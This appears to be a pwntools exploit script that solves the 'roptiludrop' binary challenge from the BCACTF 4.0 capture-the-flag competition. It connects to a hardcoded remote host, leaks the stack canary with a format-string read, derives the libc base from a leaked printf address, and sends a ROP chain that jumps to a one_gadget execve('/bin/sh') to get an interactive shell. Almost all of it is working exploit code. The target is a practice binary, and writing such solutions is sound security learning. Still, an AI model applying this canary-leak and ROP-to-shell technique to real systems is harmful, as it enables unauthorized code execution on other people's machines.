#!/usr/bin/env python3

#===========================================================
#                        BCACTF 4.0
#===========================================================

from pwn import *

exe = context.binary = ELF('./roptiludrop.elf')

host = args.HOST or '204.48.21.205'
port = int(args.PORT or 30344)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


io = start()
libc = ELF("libc-2.31.so")

io.sendline(b'%9$p')
io.recvuntil(b'> ')
canary = eval(io.recvuntil(b'What')[:-4])

io.recvuntil(b'? ')
printf_plt = eval(io.recvline(keepends=False))
libc_base = printf_plt - libc.sym["printf"]

# 0xe6c7e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

gadgets = ROP(libc)
one_gadget = libc_base + 0xe6c7e
pop_r12 = libc_base + gadgets.find_gadget(['pop r12', 'ret'])[0]
pop_r15 = libc_base + gadgets.find_gadget(['pop r15', 'ret'])[0]

payload = cyclic(24)                # trash
payload += p64(canary)              # canary
payload += p64(0xFace)              # rbp
payload += p64(pop_r12)             # ROP: pop r12; ret;
payload += p64(0x0)                 # ROP: 0x0
payload += p64(pop_r15)             # ROP: pop r15; ret;
payload += p64(0x0)                 # ROP: 0x0
payload += p64(one_gadget)          # ROP: execve("/bin/sh", r15, r12)
payload.ljust(0x50, b'\x00')
io.sendline(payload)

io.interactive()